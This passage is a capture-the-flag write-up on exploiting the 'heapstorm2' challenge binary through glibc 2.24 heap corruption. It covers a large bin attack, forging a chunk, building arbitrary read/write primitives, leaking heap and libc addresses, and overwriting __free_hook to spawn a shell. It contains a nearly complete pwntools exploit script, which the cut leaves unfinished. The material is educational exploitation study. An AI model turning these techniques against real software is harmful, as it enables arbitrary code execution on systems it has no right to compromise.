- to do this we will use the head of the 0x400-0x430 list we used in the large bin attack section along with the primitive that we have that lets us write the same heap heap address to any writable location  , the steps are as follows :
	1. write the heap address to the forged chunk's size field , but we will write it misaligned by -4 so that only the two highest non-null bytes are written , -4 exactly because :
		1. heap addresses only use 6 bytes of the 8 bytes otherwise it would have been -6 
		2. the high nibble of highest non-null byte is also not used , thus guarantees that the two bytes we write will not represent any value larger than 0x0fff. this is crucial because chunk+size should not go past 0x13378000 , note that in the reverse engineered code of `setup_strarray` only the memory between 0x13370000 and 0x13380000 is mmaped and thus if our chunk sizes causes us to go out of bounds the program will cause a segmentation fault on access to unmmaped memory.
		3. and the final thing adding to the probabilistic nature of this approach is the fact the the written size should be larger than 0x400 , since that is the minimum size requirement to use the large bins , further more , we will be placing our forged chunk at 0x400 offset of the end of the memory we wanna control ,  in this case , to control enough of the strarray memory  to complete our approach we will need to place our forged chunk at 0x13370458 , a 0x400 sized chunk there gives us control over the random bytes placed by `setup_strarray` , the bytes used in the XOR check in `view` , and some of the fields, this positioning however has consequences :
			1. as mentioned earlier , the size written should be larger or equal to 0x400 
			2. if we hand made our forged chunk at the begining of the 0x13370000-0x13380000 region , any value between 0x400 and 0xfff would be valid , however since we have to forge the chunk at 0x13370458 , any size value larger than 0xba0 will make chunk+size coincide with non-mmaped memory , and when the program tries to access chunk+size to verfify size and prev_size , it will segfault on access. this leaves with a pool of values that is roughly half of the possible values since (0xba0-0x400)/0x1000 ~= 1/2 , now the chance is about 1/32, this will be expanded on in the probabilistic and statistical analysis section.



	2.  the first check of of unlink (below) checks if the field at chunk+chunksize (which is supposed to be the prev_size field of the next chunk) has a value that is equal to the size (more accurately that is equal to the size without the flag bits),luckily since the written address does not change (even if it did , the highest bits of heap addresses remain unchanged) and thanks to our automated write primitive , we can spray the size even if we don't know its value by repeating the process of writing the highest two bits an spraying the region, but since the size depends of the highest two bits of the heap addresses , this introduces three factors that make our approach probabilistic :
		1. every 8 bytes in the spray area can hold one instance of the size , but the size itself is not 8 bytes aligned and thus chunk_address+size is not 8 bytes aligned this puts the chance of chunk+size coinciding with a sprayed size 1/8, assuming uniformly distributed values from heap address randomization.
		2. furthermore we cannot spray a size every 8 bytes , since our misaligned write method we use to write the size "pollutes" the highest bytes of the  8 bytes-long field before the target 8 bytes which hold the size  , rendering them unusable , an so we can only spray a size value every 16 bytes puts our chance at about 1/16 so far, see the probabilistic and statistical analysis section for exact insight on the chance of success. 
		```c
		\#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)\
		 /* Get size, ignoring use bits */                                          )
		\#define chunksize(p)         ((p)->size & ~(SIZE_BITS))

     if (__builtin_expect (chunksize(P) \
     != next_chunk(P)->prev_size, 0))  \
		 /*aborts*/
       malloc_printerr 
       (check_action, "corrupted size vs. prev_size", P, AV);
			 /*some code...*/
		 }
		```
		

	3.  the second check of `unlink` (below) checks whether the links of the unlinked chunk are valid , that is the `fd` field of the chunk in the unlinked chunk's `bk` should be a pointer to our chunk , and the same thing for the `bk` field of the unlinked chunk's `fd` field ,we can verify this in our chunk by :
		- writing the heap address (with the large bin variant attack) to the the `fd` and `bk` of the forged chunk .
		- writing the address of our forged chunk to the `fd` and `bk` fields of the heap chunk whose address we wrote to our forged chunk's links ,we can do that by utilizing the overlap we got earlier. this way the two chunks refer to each other in their links and so the checks are verified.
		```c
		 /* Take a chunk off a bin list */
		#define unlink(AV, P, BK, FD) { \
		
	    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))             \
			 /*some code...*/
			/*aborts*/
	      malloc_printerr  (check_action,\
	       "corrupted double-linked list", P, AV);  \
			
			 /*some code...*/
		}
		```

	4. the fourth `unlink` check (below) is if the largin bin skip bin links (bk_nextsize and fd_nextsize) are null , if so we can bypass futher tests , we can also do this with the earlier overlap.
	```c
	#define unlink(AV, P, BK, FD) { \
	/*earlier checks*/
		if (!in_smallbin_range (P->size)\
		&&\
		__builtin_expect (P->fd_nextsize != NULL, 0)) {\
		/*futher checks...*/
     }
	}           \
	```
- a demonstration of how we can verify the previous restraints is the following code that makes a valid chunk at 0x13370458 , I chose this address because it is the closest point where i can both use the largebins and have control over relevant fields of `strarray` :
```python
'''overlap and largebin attack'''

write_heapaddr_at(r,0x13370458 + 0x18)#serves as fd
write_heapaddr_at(r,0x13370458 + 0x10)#fd, same val as fd
write_heapaddr_at(r,0x13370458 + 0x8 - 4 )#serves as size

r.interactive()

#of course  we should skip the strarray area 
#if we corrupt it the fields will be destroyed and nothin
#will work
targ =  0x13371000-16-4
while targ > 0x13370480 :
    if targ not in range(0x133707f0,0x13370920):
        write_heapaddr_at(r,targ)
    targ -= 16
r.interactive()
```
- the 0x13370458 memory after the first writes :
```gdb
pwndbg> x/10gx 0x13370458
0x13370458:	0xcad609d000000000	0x00000000000004dd
0x13370468:	0x000004ddcad609d0	0x000004ddcad609d0
0x13370478:	0x0000000000000000	0x0000000000000000
0x13370488:	0x0000000000000000	0x0000000000000000
0x13370498:	0x0000000000000000	0x0000000000000000
```
- the sprayed memory after the spraying loop looks like this :
```gdb
pwndbg> x/200gx 0x13370458 + 0x4dd
0x13370935:	0xd000000000000000	0x00000004ddcad609
0x13370945:	0xd000000000000000	0x00000004ddcad609
0x13370955:	0xd000000000000000	0x00000004ddcad609
0x13370965:	0xd000000000000000	0x00000004ddcad609
....
0x13370fc5:	0xd000000000000000	0x00000004ddcad609
0x13370fd5:	0xd000000000000000	0x00000004ddcad609
0x13370fe5:	0xd000000000000000	0x00000004ddcad609
0x13370ff5:	0x0000000000000000	❌️ Cannot access memory at address 0x13370ffd
```
- notice that the sizes sprayed at chunk(0x13370458)+size(0x4dd) and after are not valid , even through the size is within 0x400 and 0xba0 , but since it does not satisfy the alignment requirement (8 bytes alignment) it does not coincide with the valid size , if we take the perspective of an aligned size , adding 0x4c8 for example : 
```gdb
pwndbg> x/200gx 0x13370458 + 0x4c0
pwndbg> x/200gx 0x13370458 + 0x4d8
0x13370930:	0x00000000000004dd	0xcad609d000000000
0x13370940:	0x00000000000004dd	0xcad609d000000000
0x13370950:	0x00000000000004dd	0xcad609d000000000
....
0x13370f40:	0x00000000000004dd	0xcad609d000000000
0x13370f50:	0x00000000000004dd	0xcad609d000000000
0x13370f60:	0x00000000000004dd	0xcad609d000000000
```
- this demonstrates both :
	- the need for alignment , the size is valid when viewed from an aligned point
	- what prevents us from spraying every 8 bytes , notice the higher 4 bytes of every 8 bytes field after a valid size are "polluted" by the remainders of the misaligned writes.


#### Returning the forged chunk
- if we suppose that we get a valid address , using the logic described in the `the large bin allocation logic` section , we can make `_int_malloc` return the chunk we forged by allocating a chunk that falls within the range of the bin we are working in which is 0x400-0x430 and the head of the bin should be able to satisfy the request (refer to the code in the fore-mentioned section), else if the size if invalid and depending on the reason why it is invalid , on such request `_int_malloc` will :
	- if the size of the forged chunk is smaller than 0x400 , the allocation will skip our forged chunk and the head of the bin will be return instead , this is a consequence of both the fact that we put the head address (which is the address written by the large bin attack) to the links of our forged chunk and the fact that the head has to initially be able to satisfy the request.
	- if the size is larger than 0xba0 , the operation will cause a segmentation fault when `unlink` tries to verify the validity of the `prev_size`  field of the next chunk , accessing forged_chunk+size , which is non-mmaped memory.
	- if the size is within bounds but is misaligned to 8 , the `prev_size` check in `unlink` will fail and an abort signal will be produced , the program will crash.
	- if the size is within bounds , aligned , but coincides with an 8 bytes that are "polluted" as described earlier this section instead of the ones that have the size , the program will produce an abort signal and crash
- if none of the four conditions above apply however , `_int_malloc` following the logic described in `The overlap primitive` section , will do the following :
	- if request_size - forged_chunk_size < 16 , it will return our forged chunk as is , this is called "exhausting" the chunk.
	- else it will :
		- split the forged chunk 
		- replace the size we have written with the request size 
		- make a new chunk at forged_chunk+request_size with a size equal to forged_chunk_size-request size and put this new chunk in the unsorted bin 
		- and finally it will satisfy our request from the forged chunk and thus malloc would have returned memory from our forged chunk.
- for demonstration , this script will have malloc return a forged chunk assuming the forged size is valid :
```python
'''loop over this'''

'''overlap,largebin attack,chunk forging,sprarying....'''

#forgin links in the bin head
fake_links = 4*p64(0x13370458)
links_payload = fake_links+\
        (0x800-16-len(fake_links))*b'A'\
        +p64(0x0)+p64(0x411) +fake_links

#using overlap
resp = update(r,2,len(links_payload),links_payload)
gdb.attach(r)
#returning the forged chunk
tmp = allocate(r,0x400-0x8)#10
payload  = 0x(400-8-12)*b'A'
resp = update(r,tmp,len(payload),payload)
gdb.attach(r)
```
- the script above does the following :
		1.  forges the links in the bin head chunk as to satisfy `unlink` checks , as described in the `forgin a valid chunk in the 0x13370000-0x13380000 region` section 
		2. attempts to allocate a chunk that is the size of the head , this way the head satisfies the request  and so the bin is searched , if our forged chunk is valid , it will be returned by this operation.
		3. overwrites the `strarray` region with a series of As (0x41 ascii)
- here is the links of the head of the bin after forging the links, note that the addresses in this example might differ from the next one , since at this point we don't know yet if the allocation will succeed and thus i took this snapshot for the first attempt of the loop and let the loop run till a successful attempt have been made to take the next snapshots.
```gdb
largebins
0x400-0x430: 0xe0c6aab0d90 —▸ 0x13370458 ◂— 0xe0c6aab0d90

pwndbg> x/10gx 0xe0c6aab0d90
0xe0c6aab0d90:	0x0000000000000000	0x0000000000000401
0xe0c6aab0da0:	0x0000000013370458	0x0000000013370458
0xe0c6aab0db0:	0x0000000013370458	0x0000000013370458
0xe0c6aab0dc0:	0x4141414141414141	0x4141414141414141
0xe0c6aab0dd0:	0x4141414141414141	0x4141414141414141
```
- notice that the links point to our forged chunk

- this is a snapshot of the memory at 0x13370800 on a successful attempt :
```gdb
pwndbg> x/10gx 0x13370800
0x13370800:	0x4141414141414141	0x4141414141414141
0x13370810:	0x4141414141414141	0x4141414141414141
0x13370820:	0x4141414141414141	0x4141414141414141
0x13370830:	0x4141414141414141	0x4141414141414141
0x13370840:	0x4141414141414141	0x4141414141414141
```

- we have succeeded in making `_int_malloc` return a forged chunk and used that to edit `strarray` region.

### Arbitrary read/write primitives
- in the previous section we returned an arbitrary chunk from `_int_malloc` , that gave us control over the `strarray` region , in this section we will use that to reliably get arbitrary read/write primitives.
- to understand how we can do that , we will expand upon how does the binary perform the writes and reads to the allocated chunks .
#### Chunk addresses obfuscation
- first see the `strarray` section for the contents of the first 32 bytes at 0x13370800
##### mask_size and mask_buff functions
- these two functions are used throughout the implementations of the binaries functionalities , and they are the main tool used to obfuscate and deobfuscate the address at storing and retrieval time (resp.) , their implementation along with the `buff_info` structure is the following :
```c
struct __fixed buff_info // sizeof=0x10
{
	__int64 buff;
	__int64 size;
};

__int64 __fastcall mask_size(struct buff_info *a1, __int64 a2)
{
  return a2 ^ a1->size;
}

char *__fastcall mask_buff(struct buff_info *a1, unsigned __int64 a2)
{
  return (char *)(a1->buff ^ a2);
}
```
- notice that :
	- buff and size are both 8 byte fields 
	- `mask_size` returns the input value `a1` `XOR`ed with the `size` field of the input value `a1`
	- `mask_buff` is similar to `mask_size` except it `XOR`s the value with the `buff` field instead.
##### Obfuscation in the allocate function
- on success , the `allocate` function stores the allocated address with the following logic :
  ```c
	void __fastcall allocate(struct buff_info *strarray)
{
/*some code...*/
	strarray[i + 2].size = mask_size(strarray, size);
	strarray[i + 2].buff =
	 (__int64)mask_buff(strarray, (unsigned __int64)buff);
/*some code...*/
  ```
- referencing the implementations above we know that the addresses are stored obfuscated by being `XOR`ed with the random 8 byte value at 0x1337800(->buff) and their sizes `XOR`ed with the value at 0x13370808(->size)
##### Deobfuscation in the view/update functions 
- in the retrieving of the `view` function :
```c
int __fastcall view(struct buff_info *a1)
{
/*some code...*/
  size = mask_size(a1, a1[(int)idx + 2].size);
  buff = mask_buff(a1, a1[(int)idx + 2].buff);
/*printing logic...*/
}
```
- and the `update` function :
```c
int __fastcall update(struct buff_info *a1)
{
/*some code...*/
size = readlong();
  if ( size <= 0 ||
   size  > (mask_size(a1, a1[idx + 2].size) - 12) )
    return puts("Invalid Size");
  printf("Content: ");
  buff = mask_buff(a1, a1[(int)idx + 2].buff);
```
- notice : `mask_size` is used in the size bounds check

- when the values should be retrieved from `strarray` , they are deobfuscated by being passed again to `mask_size` and `mask_buff` this makes sense since a double `xor` with the same values  restores the original chunk addresses and sizes .

##### Bypassing the obfuscation 
- given we have the ability to overwrite the `strarray` region , a direct method to gain write/read to any address is to write that address to a chunk field in `strarray` and use the program functionalities to perform the read/write through `view`/`update` functions , to do that however we need the address we write to stay unaffected by the deobfucation process described in the previous section.
- to do this we will overwrite the first 16 bytes values at 0x13370800 with 0x0 , so when the `mask_size` and `mask_buff` `XOR` our planted address and size with those values , they remains unaffected (know that `XOR`ing a value with 0 results in the same value) and the write/read proceeds normally .

#### Bypassing the view check 
- by bypassing the obfuscation we can plant addresses and write to it , but the `view` section has one additional check we need to verify before any read is done , which is that the `XOR` result of the 8 bytes at 13370810 and 13370818 should be 0x13377331 , see the code below.
```c
int __fastcall view(struct buff_info *a1)
{
/*some code...*/
 if ( (a1[1].size ^ a1[1].buff) != 0x13377331 )
    return puts("Permission denied");
/*some code...*/
}
```
- to verify this we will use the same property of the `XOR` operation , we will write 0x13377331 to the 8 bytes at 0x13370810 and 0x0 to the 8 bytes  at 0x13370818 , since 0x13377331 ^ 0x0 = 0x13377331 , the check will pass.
#### Getting arbitrary read/write primitives
- this script uses the forged chunk we return from `_int_malloc` and the above technique to bypass the obfuscation and write to a chosen address , 0x13370d00 in this case :
```python
'''overlap,large bin attack,returning forged chunk'''

forged_chunk = allocate(r,0x400-0x8)#10
payload  = 0x398*b'Y' + 3*p64(0) + p64(0x13377331)\
        +p64(0x13370d00)+p64(0x50)+p64(0x13370820)+p64(0x50)
resp = update(r,forged_chunk,len(payload),payload)
gdb.attach(r)
```
-  this script overwrites the `strarray` region by :
	1. replacing the first 16 random bytes at 0x13370800by 0x0
	2. replacing the second 16 bytes used in the `view` check by 0x13377331 and 0x0 (resp.) .
	3. overwriting the third 16 bytes , which are the first chunk stored in `strarray` and its size by 0x13370d00 and 0x50 
	4. overwriting the third 16 bytes , which are the first chunk stored in `strarray` and its size by 0x13370820 and 0x50 
- to demonstrate that our write was successful , here is a gdb dump of the memory at 0x13370800:
```gdb
pwndbg> x/10gx 0x13370800
0x13370800:	0x0000000000000000	0x0000000000000000
0x13370810:	0x0000000000000000	0x0000000013377331
0x13370820:	0x0000000013370d00	0x0000000000000050
0x13370830:	0x0000000013370820	0x0000000000000050
0x13370840:	0x524f545350414548	0x0000000049495f4d
```



- next we will test our write primitive , we will call update the 0x13370d00 address by calling `update` on index 0 , notice that in the code of `update` +2 is always added to the index (because the first pair of 8 bytes are used for special purposes) , thus even if the address that hold 0x13370d00 is 0x13370820 , it is index zero because the program will add 2\*0x10 , code :
```python
'''overlap,large bin attack,returning forged chunk,
strarray overwite'''

resp = update(r,0,8,8*b'V')
gdb.attach(r)
```
- the contents of the memory after this executes is :
```gdb
pwndbg> x/10gx 0x13370d00
0x13370d00:	0x5656565656565656	0x524f545350414548
0x13370d10:	0x0000000049495f4d	0x8c827cb000000000
```
- note that the other values besides the 0x56s (V ascii) are from the spraying we have done in the `returning a forged chunk from _int_malloc` section.


- having satisfied the `view` check , we will test our arbitrary view primitive to print the contents of the memory at 0x13370d00 after we have written to it , the demonstration code is as follows :
```python
'''overlap,large bin attack,returning forged chunk,
strarray overwite , write to 0x13370d00'''

resp = view(r,0)
print(resp)
gdb.attach(r)
```
- the output is :
```text
b'VVVVVVVVHEAPSTORM_II\x00\x00\x00\x00\x00\x00\x00\x000H[\xf6(\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000H[\xf6(\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000H[\xf6(\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000H[\xf6\n1. '
```


- at this point we have achieved arbitrary read/write primitives .

#### Automating the arbitrary write/read primitives
- before spawning a shell , we'll make two abstractions to help us read an write to any memory easily , we'll do this by :
	- reserving the chunk/size field of index zero and write 0x13370830 , this will give us control over all the other fields  , because now calling update on index 0 will let us write to 0x13370830 and forwards.
	- when we want to write to a field , we will call update on index 0 , write the address and a valid size the the first 16 bytes, and then perform our read/write by calling `update` or `view` on index 1.
- here is the demonstration code :
```python
'''overlap,large bin attack,returning forged chunk'''

forged_chunk = allocate(r,0x400-0x8)#10
payload  = 0x398*b'Y' + 3*p64(0) + p64(0x13377331)\
        +p64(0x13370830)+p64(0x80)
resp = update(r,forged_chunk,len(payload),payload)

def write_what_where(r,target,value):
    fake_buff = p64(target)+p64(len(value)+12)
    resp = update(r,0,len(fake_buff),fake_buff)
    resp = update(r,1,len(value),value)

def read_size_where(r,target,size):
    fake_buff = p64(target)+p64(size)
    resp = update(r,0,len(fake_buff),fake_buff)
    resp = view(r,1)
    return resp[0:size]


write_what_where(r,0x13370f00,8*b'I')
resp = read_size_where(r,0x13370f00,8)
print(resp)
write_what_where(r,0x13370c00,8*b'V')
resp = read_size_where(r,0x13370c00,8)
print(resp)
gdb.attach(r)
```
- the output is : 
```text
b'IIIIIIII\n1. '
b'VVVVVVVV\n1. '
```
- we have successfully automated arbitrary reads/writes

### The leaks
#### Heap leak 
- with our capability of performing arbitrary read/writes , we can get heap leaks by :
	1. allocating a chunk , since we set the 8 bytes values at 0x13370800 to 0 , the chunks will be stored unobfuscated
	2. reading the `strarray` memory that has the allocated chunk's address
- to make sure that our allocated chunk is written to a predictable location we will 
	1. fill the memory from the 0x13370840 (just after the end of the size field we use for arbitrary read/write operations) to 0x133708b0 with non null values , this will prevent it from being used to allocation (see code below)
	2. write 0x0 to all the bytes of the chunk and size fields at 0x133708c0,0x133708c0 and 0x133708d0 , by ensuring that those fields are zeroed , we ensure that they will by first used for allocations , we need three allocation for reasons that will be discussed in the `libc leak` section.
```c
void __fastcall allocate(struct buff_info *strarray)
{
/*some code*/

  for ( i = 0; i <= 15; ++i )
  {
    if ( !mask_size(strarray, strarray[i + 2].size) )
    {
		/*allcation code*/
    }
  }
}
```
- notice that in order to use a field in `strarray` , `mask_size` of the size field should be 0 , by setting size to zero and since the `XOR`ing values at 0x13370800 are also zero , this condition is satisfied and the chunk fields at 0x133708b0,0x133708c0,0x133708d0, are used consecutively, while we made sure none before will be used because we filled their fields with non-zero bytes
- the demonstration code is as follows :
```python

'''overlap,large bin attack,returning forged chunk,read/write'''

write_what_where(r,0x133708b0,2*p64(0))
write_what_where(r,0x133708c0,2*p64(0))
write_what_where(r,0x133708d0,2*p64(0))
write_what_where(r,0x13370840,2*p64(0xf))
write_what_where(r,0x13370878,(0xc0-0x78-12)*b'A')
gdb.attach(r)
```
- notice that we skip the region from 0x13370860 to 0x13370578 when writing non-zero values, this is because that memory hold the metadata of the "rest" of our forged chunk after a split was made (see the `returning forged chunks from \_int_malloc` section ) , since that field is still in the unsorted bin , it might be checked for allocation and it should remain valid.
- keep in mind that all writes have "HEAPSTROM_II\0" appended to them , this is our 16 bytes write to 0x13370840 in fact fact writes 16+13 bytes corrupting memory at 0x13370850 and 0x13370858 , if we had written 32 bytes as might be expected , we will corrupt the fields at 0x13370860 which are the metadata of the "rest" chunk. that is also the reason we substract 12 from the size of the write at 0x13370878.
- running this the gdb memory dump is :
```gdb
pwndbg> x/30gx 0x13370800
0x13370800:	0x0000000000000000	0x0000000000000000
0x13370810:	0x0000000000000000	0x0000000013377331
0x13370820:	0x0000000013370830	0x0000000000000080
0x13370830:	0x0000000013370878	0x0000000000000038
0x13370840:	0x524f545350414548	0x0000000049495f4d
0x13370850:	0x524f545350414548	0x0000000049495f4d
0x13370860:	0x0000000000000559	0x0000612ebf399b58
0x13370870:	0x0000612ebf399b58	0x4141414141414141
0x13370880:	0x4141414141414141	0x4141414141414141
0x13370890:	0x4141414141414141	0x4141414141414141
0x133708a0:	0x5041454841414141	0x49495f4d524f5453
0x133708b0:	0x0000000000000000	0x0000000000000000
0x133708c0:	0x0000000000000000	0x0000000000000000
0x133708d0:	0x0000000000000000	0x0000000000000000
0x133708e0:	0x524f545350414548	0x6501d00049495f4d
```
- every field is non-zero except 0x133708c0 and 0x133708d0
- now if we perform an allocation :
```python
'''overlap,large bin attack,returning forged chunk,read/write , spraying non-null values and zeroing 0x133708c0 and 0x133708d0'''

tmp2 = allocate(r,0xe00)
gdb.attach(r)
```
- the result is : 
```gdb
pwndbg> x/30gx 0x13370800
pwndbg> x/30gx 0x13370800
0x13370800:	0x0000000000000000	0x0000000000000000
0x13370810:	0x0000000000000000	0x0000000013377331
0x13370820:	0x0000000013370830	0x0000000000000080
0x13370830:	0x0000000013370878	0x0000000000000038
0x13370840:	0x524f545350414548	0x0000000049495f4d
0x13370850:	0x524f545350414548	0x0000000049495f4d
0x13370860:	0x0000000000000189	0x000065b2dc599cc8
0x13370870:	0x000065b2dc599cc8	0x4141414141414141
0x13370880:	0x4141414141414141	0x4141414141414141
0x13370890:	0x4141414141414141	0x4141414141414141
0x133708a0:	0x5041454841414141	0x49495f4d524f5453
0x133708b0:	0x00000588a326a710	0x0000000000000b00
0x133708c0:	0x0000000000000000	0x0000000000000000
0x133708d0:	0x0000000000000000	0x0000000000000000
0x133708e0:	0x524f545350414548	0x7d43420049495f4d
```
- notice the heap address and the size we requested at 0x133708b0 and 0x133708b8 (resp.)
- next we can read the memory at 0x133708c0 and get the address :
```python
'''overlap,large bin attack,returning forged chunk,read/write , spraying non-null values and zeroing 0x133708b0,0x133708c0 and 0x133708d0,allcation'''

heapleak = u64(read_size_where(r,0x133708b0,8))
print(f"\nheap leak : {hex(heapleak)}")
gdb.attach(r)
```
- the output of the script is :
```text
heap leak : 0x8286291af00
```
- and checking with `gdb` confirms it is a valid heap address
#### Libc leak
- to get a libc leak we will leverage the fact that when chunks are freed and inserted into the unsorted bin , they are always inserted at the head (the unsorted bin is a LIFO structure) , this mean that the value of the `fd` field of the bin header and the `bk` field of the previous head both become the address of the freed chunk , more importantly , the `bk` field of the freed chunk that will become the head is set to the bin header , and the `fd` field to the previous head , since the  bin header resides in libc , at a fixed offset from the base , if free the chunk and read its `bk` field (offset +8) , we will get a `libc` address . (see the code below)
```c
_int_free (mstate av, mchunkptr p, int have_lock){
	/*...some code*/
		
  /*
Place the chunk in unsorted chunk list. Chunks are
not placed into regular bins until after they have
been given one chance to be used in malloc.
  */

  bck = unsorted_chunks(av);
  fwd = bck->fd;
	/*...some code*/
  p->fd = fwd;
  p->bk = bck;
	/*...some code*/
  bck->fd = p;
  fwd->bk = p;

	/*...some code*/
}
```
- in this code , `bck` is the header of the unsorted bin  `fwd` is the previous head  and `p` is our freed chunk , line `p->bk = bck;` is what places the bin header (libc) address in our freed chunk.

- note that if the freed chunk is adjacent to the top of the heap or to another free chunk , it will be consolidated into the heap or with the freed chunk , to prevent complications , i also allocate a `guard` chunk to prevent forward consolidation , and another to prevent backwards consolidation , while our freed chunk will be in the middle. this means that will will :
	- allocate three chunk 
	- leak the address of the chunk one in the middle ,stored at 0x133708c0
	- free the chunk we leaked
	- read its `bk` field
	- deduce `libc` base
- here is the demonstration code :
```python
'''overlap,large bin attack,returning forged chunk,read/write , spraying non-null values and zeroing 0x133708b0,0x133708c0 and 0x133708d0'''

#heap leak
allocate(r,0xb00)#backwards guard
tmp2 = allocate(r,0xe00)
allocate(r,0xd00)#forwards guard
heapleak = u64(read_size_where(r,0x133708c0,8))
print(f"\nheap leak : {hex(heapleak)}")

#put in the unsorted bin
delete(r,tmp2)

#libc leak
#read bk
libcleak = u64(read_size_where(r,heapleak+8,8))
libcelf.address = libcleak - 3775320
print(f"\nlibc base : {hex(libcelf.address)}")
gdb.attach(r)
```
- the output is :
```text
heap leak : 0xb2807764be0

libc base : 0x620584a00000
```
- checking `gdb` for the base of `libc` :
```gdb
pwndbg> libcinfo
libc: glibc
libc version: 2.24
linked: dynamically
.... some output
    libc is at:             0x620584a00000
.... some output
```
- this matches our leak.

### Getting a shell
- we have successfully leaked base of `libc` , we can get a shell by abusing the `__free_hook` field in `libc` , which is a pointer that if not null , will always be called first on any call to `free`   , see the following code :
```c

strong_alias (__libc_free, __free) strong_alias (__libc_free, free)

void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }

	/*some code...*/

  p = mem2chunk (mem);
	
	/*some code...*/

  _int_free (ar_ptr, p, 0);
}
```
- the strong alias first line mean that `__libc_free` is analogous to the `free` call , a normal call to `free` invokes `__libc_free` 
- from the code in the definition of `__libc_free` , we observe that if `hook` which is copied from `__free_hook` is non-null , it is called as a function and given a pointer to the memory to-be-freed as its first argument.
- we can also see that the `__libc_free` is just a wrapper around `_int_free` , see call at the end.

- to get a shell we will :
	- overwrite the `__free_hook` field with the address of `system` 
	- make a chunk that contains "/bin/sh;..."(... is the appended "HEAPSTORM_II\0" , we separate our command with ; to make it a standalone command)
	- free that chunk , the hook will take effect first and system("/bin/bash;...") will be called , and we get a shell
- here is a demonstration :
```python
'''overlap,large bin attack,returning forged chunk,read/write , getting leaks'''
#shell
free_hook = libcelf.symbols['__free_hook']
system_addr = libcelf.symbols['system']

write_what_where(r,free_hook,p64(system_addr))

command_chunk = allocate(r,0xe00)
command = b"/bin/bash;"
resp = update(r,command_chunk,len(command),command)
delete_getshell(r,command_chunk)
exit()
```
- notice that i use `libcelf.symbols[...]` to get the addresses , i am using a functionality in the `pwntools` python library that given the base address of an elf file (`libc` in this case) will calculate the addresses of symbols by name.
- i allocate exactly 0xe00 in order the retrieve the chunk we put in the unsorted bin in the `libc leak` section , as it was the same size , this is a "safer" and more direct execution path.
- `delete_getshell` is a variant of the `delete` function used previously that instead of waiting for deletion confirmation from the binary , hands the user a shell , the exact implementation are in the following `exploit` section
- and soon enough we get a shell
```text
heap leak : 0x628be60bad0

libc base : 0x6d9bf5000000

congratz!
$ ls
heapstorm2.id0	     ld-linux-x86-64.so.2 ...
$ echo "got a shell"
got a shell
$
```
## Exploit
full exploit code , including retry and failure count automation :
```python
#!/usr/bin/python

#DISCLAIMER : this is not the intended solution and it is not as reliable
#see the proper solution at :
#raw.githubusercontent.com/scwuaptx/CTF/master/2018-writeup/0ctf/heapstorm.py
#this one used a different primitive at one stage
#and is done largely for learning reasons
#attemps before success average at 50 locally
#takes less than 30 secs on modest hardware

from pwn import *

context.log_level='critical'
libcelf = ELF("./libc.so.6")
heapstorm_elf = ELF("./heapstorm2_patched")
#for gdb&split-in-mind window
context.terminal = ['tmux', 'new-window']

def allocate(r,size):
    r.sendline(b'1')
    r.recvuntil(b'Size: ')
    r.sendline(str(size).encode())
    resp = r.recvuntil(b'Allocated\n')
    resp = resp[6:8]
    return int(resp)

#data is , of course ,bytes :D
def update(r,idx,size,data):
    r.sendline(b'2')
    r.recvuntil(b'Index: ')
    r.sendline(str(idx).encode())
    r.recvuntil(b'Size: ')
    r.sendline(str(size).encode())
    r.recvuntil(b'Content: ')
    r.sendline(data)
    resp = r.recvuntil(b'Updated\n')
    resp = resp[6:8]
    return int(resp)

def delete_getshell(r,idx):
    r.sendline(b'3')
    r.recvuntil(b'Index: ')
    r.sendline(str(idx).encode())
    r.sendline(b'echo congratz')
    resp = r.recv()
    if b"congratz" in resp :
        print("\ncongratz!")
        r.interactive()
        exit()
    print("\nno shell")
    exit()

def delete(r,idx):
    r.sendline(b'3')
    r.recvuntil(b'Index: ')
    r.sendline(str(idx).encode())
    resp = r.recvuntil(b'Deleted\n')
    resp = resp[6:8]
    return int(resp)

def view(r,idx):
    r.sendline(b'4')
    r.recvuntil(b'Index: ')
    r.sendline(str(idx).encode())
    r.recvuntil(b': ')
    resp = r.recvuntil(b'1. ')
    return resp

def flush_unsorted(r):
    tmp = allocate(r,0x1000)#10
    delete(r,tmp)

attempt = 0
while True :
    r = process("./heapstorm2_patched")
    allocate(r,2048-8)#0
    allocate(r,2048-8)#1//unlinked
    allocate(r,0x1000-8)#2//overlap
    allocate(r,0x1000-8)#3
    allocate(r,0x1000-8)#4
    allocate(r,0x1000-8)#5
    allocate(r,0x100-8)#6
    allocate(r,0x100-8)#7
    allocate(r,0x100-8)#8
    allocate(r,0x800)#9
    allocate(r,0x800)#10

    #overlap

    # forge prev size and clear the prev-inuse bit
    for i in range(9):
        if i != 7:
            resp = update(r,6,0x100-8-12-i, (0x100-8-12-i)*p8(0))

    delete(r,1)
    flush_unsorted(r)
    # unlinks with 1
    delete(r,7)
    #no overlap in the first 0x800 bytes(chunk 1)
    #since they were actually freed
    allocate(r,2048-8)#1


    #allocations now will overlap with chunks from 2 to 7


    #largbin attack

    #setting up the head of the bin
    head = allocate(r,0x400-8)
    allocate(r,0x500-8)#guard to prevent consolidation
    delete(r,head)
    flush_unsorted(r)

    def write_heapaddr_at(r,loc):
        #notice that the size is slightly larget than the head
        #this is to ensure it will be inserted second written=allocate(r,0x400)
        written=allocate(r,0x400)
        guard = allocate(r,0x400)#guard , avoid consolidation
        ##the last two are placeholders they let this not crash :
        '''
        else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }
        '''
        ##the first two are the essantial one ones that do the write using :
        '''
          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;
        '''
        chunk = 2*p64(loc-0x10) + 2*p64(0x13370000-0x20)
        resp = update(r,2,len(chunk),chunk)
        #put in unsorted
        delete(r,written)
        #insertion caused by this flush does our write
        flush_unsorted(r)
        delete(r,guard)


#setting up a fake chunk in 0x13370458
